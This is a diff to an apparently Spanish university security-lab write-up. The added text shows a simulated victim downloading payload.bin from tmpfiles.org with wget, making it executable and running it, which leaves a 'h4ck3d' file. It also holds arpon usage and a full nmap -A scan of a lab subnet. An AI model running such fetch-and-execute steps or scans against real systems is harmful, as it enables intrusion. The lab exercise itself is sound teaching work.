@@ -1319,9 +1319,39 @@ exit
 msf6 exploit(multi/handler) > exit
 ```
 
+En la máquina de la víctima sinulamos una descarga del href introducido:
+
+```bash
+root@debian:/home/lsi# wget https://tmpfiles.org/dl/207895/payload.bin
+--2022-11-03 13:49:32--  https://tmpfiles.org/dl/207895/payload.bin
+Resolving tmpfiles.org (tmpfiles.org)... 104.21.21.16, 172.67.195.247, 2606:4700:3030::6815:1510, ...
+Connecting to tmpfiles.org (tmpfiles.org)|104.21.21.16|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 207 [application/x-executable]
+Saving to: 'payload.bin'
+
+payload.bin                                  100%[============================================================================================>]     207  --.-KB/s    in 0s
+
+2022-11-03 13:49:33 (215 MB/s) - 'payload.bin' saved [207/207]
+
+root@debian:/home/lsi# file payload.bin
+payload.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
+root@debian:/home/lsi# chmod +x payload.bin
+root@debian:/home/lsi# ./payload.bin
+root@debian:/home/lsi# ls
+ Descargas    Escritorio	     'M'$'\303\272''sica'  'P'$'\303\272''blico'   etcinitd     hola.txt   ossec-hids-3.7.0	  payload.bin
+ Documentos  'Im'$'\303\241''genes'   Plantillas	   'V'$'\303\255''deos'    h4ck3d.txt   mbox	   ossec-hids-3.7.0.zip   scripts
+root@debian:/home/lsi# cat h4ck3d.txt
+h4ck3d
+```
+
 ### Apartado H
 
 Haga un MITM en IPv6 y visualice la paquetería.
+
+ ```bash
+ 
+ ```
 
 ### Apartado I
 
@@ -1354,13 +1384,11 @@ root@debian:/home/lsi# cat /etc/arpon.conf
 #10.0.1.1        58:ac:78:88:1a:bb
 # Second static entry:
 #10.0.10.1       90:94:e4:7e:f4:59
-root@debian:/home/lsi# 
 root@debian:/home/lsi# arpon -d -i ens33 -H
-root@debian:/home/lsi# Nov 01 16:14:49 [INFO] Background process is running (15324).
-
-root@debian:/home/lsi# ps -A | grep arpon
-  15324 ?        00:00:00 arpon
-root@debian:/home/lsi# kill 15324
+root@debian:/home/lsi# Nov 03 14:32:19 [INFO] Background process is running (2022).
+ps -A | grep arpon
+   2022 ?        00:00:00 arpon
+root@debian:/home/lsi# kill 2022
 ```
 
 ### Apartado J
@@ -1372,7 +1400,79 @@ root@debian:/home/lsi# nmap -A 10.11.48.0/23 > nmap_full.txt
 ```
 
 ```
+root@debian:/home/lsi# cat nmap_full.txt
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-11-03 14:33 CET
+Nmap scan report for 10.11.48.1
+Host is up (0.00084s latency).
+All 1000 scanned ports on 10.11.48.1 are filtered
+MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
 
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.84 ms 10.11.48.1
+
+Nmap scan report for 10.11.48.3
+Host is up (0.00018s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE    VERSION
+22/tcp open  tcpwrapped
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp open  http       Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: 403 Forbidden
+MAC Address: 00:50:56:97:2C:BF (VMware)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/3%OT=80%CT=1%CU=31413%PV=Y%DS=1%DC=D%G=Y%M=005056%T
+OS:M=6363C655%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I
+OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
+OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
+OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
+OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
+OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
+OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
+OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:N%T=40%CD=S)
+
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.18 ms 10.11.48.3
+
+Nmap scan report for 10.11.48.16
+Host is up (0.00029s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh?
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+MAC Address: 00:50:56:97:2C:AD (VMware)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+...
+...
+HOP RTT     ADDRESS
+1   0.16 ms 10.11.49.165
+
+Nmap scan report for debian (10.11.48.50)
+Host is up (0.000039s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE    VERSION
+22/tcp  open  tcpwrapped
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp  open  http       Apache httpd 2.4.54 ((Debian))
+|_http-title: \xC3\x81lvaro Freire \xE2\x80\x94 Software Developer
+514/tcp open  shell?
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux 2.6.32
+Network Distance: 0 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 512 IP addresses (190 hosts up) scanned in 2190.24 seconds
 ```
 
 Realice alguna de las pruebas de port scanning sobre IPv6.
